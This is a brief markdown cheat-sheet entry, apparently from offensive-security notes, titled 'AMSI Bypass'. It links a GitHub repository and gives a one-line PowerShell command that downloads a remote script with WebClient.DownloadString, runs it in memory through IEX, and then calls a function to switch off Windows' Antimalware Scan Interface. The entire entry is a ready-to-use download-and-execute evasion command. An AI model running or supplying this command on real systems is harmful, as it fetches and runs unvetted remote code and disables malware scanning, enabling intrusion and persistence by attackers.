# AMSI Bypass

## Option 1 (Detected by AV)

- https://github.com/V-i-x-x/AMSI-BYPASS/


```powershell
IEX (New-Object System.Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/V-i-x-x/AMSI-BYPASS/main/POC.ps1
’); MagicBypass -InitialStart 0x50000
```